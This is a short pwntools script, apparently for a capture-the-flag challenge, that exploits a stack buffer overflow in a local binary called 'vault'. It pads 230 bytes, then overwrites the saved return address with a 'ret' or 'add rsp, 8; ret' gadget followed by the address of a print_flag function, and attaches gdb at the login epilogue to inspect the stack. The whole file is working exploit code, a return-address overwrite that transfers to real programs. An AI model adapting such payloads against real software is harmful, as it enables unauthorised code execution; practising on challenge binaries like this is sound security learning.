from pwn import *

context.binary = ELF("./vault", checksec=False)
context.log_level = "debug"

OFFSET     = 230
PRINT_FLAG = 0x40119c
RET        = 0x401016         # plain `ret`
ADJ        = 0x401012         # `add rsp, 8 ; ret`
EPILOGUE   = 0x401374         # `leave ; ret` sequence in login()

def run_with(payload, label):
    print(f"\n=== {label} ===")
    print(f"len(payload)={len(payload)}")
    print(f"tail={payload[-24:].hex()}")

    p = process("./vault")
    # break at login epilogue so we can examine the saved RIP slot at [rsp]
    gdb.attach(p, gdbscript=f"""
        b *{hex(EPILOGUE)}
        c
    """)
    p.sendlineafter(b"Username:", payload)
    p.interactive()

pad = b"A"*OFFSET

# Variant 1: plain ret -> print_flag
payload_v1 = pad + p64(RET) + p64(PRINT_FLAG)

# Variant 2: adjust rsp then print_flag (skips 8 bytes)
payload_v2 = pad + p64(ADJ) + p64(0xdeadbeefdeadbeef) + p64(PRINT_FLAG)

run_with(payload_v1, "ret -> print_flag")
# After you test v1, Ctrl-C to end, then try v2:
# run_with(payload_v2, "add rsp,8 ; ret -> print_flag")

